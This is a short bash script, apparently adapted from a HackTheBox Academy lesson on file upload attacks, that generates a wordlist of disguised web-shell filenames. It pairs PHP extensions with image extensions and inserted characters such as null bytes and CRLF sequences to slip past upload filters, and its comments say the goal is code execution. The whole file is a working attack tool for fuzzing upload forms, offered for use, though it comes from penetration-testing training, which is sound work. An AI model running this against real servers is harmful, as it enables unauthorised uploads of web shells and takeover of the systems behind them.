#Modified from HackTheBox Academy bash script in File Upload Attacks module
#Modified by: Screptillian
#Also works for Windows based php, can be modified to work with aspx
#Used to test for what files are allowed to be uploaded, paired with a get request using the same list OR a shortened list of what files were made can
#greatly assist in achieving code execution

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.php2' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phtml' '.phtm' '.phar' '.phpt' '.pgif'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
        echo "shell.png$ext$char" >> wordlist.txt
        echo "shell.png$char$ext" >> wordlist.txt
        echo "shell$ext$char.png" >> wordlist.txt
        echo "shell$char$ext.png" >> wordlist.txt
        echo "shell.jpeg$char$ext" >> wordlist.txt
        echo "shell.jpeg$ext$char" >> wordlist.txt
        echo "shell$ext$char.jpeg" >> wordlist.txt
        echo "shell$char$ext.jpeg" >> wordlist.txt
        echo "shell.gif$ext$char" >> wordlist.txt
        echo "shell.gif$char$ext" >> wordlist.txt
        echo "shell$char$ext.gif" >> wordlist.txt
        echo "shell$ext$char.gif" >> wordlist.txt
    done
done
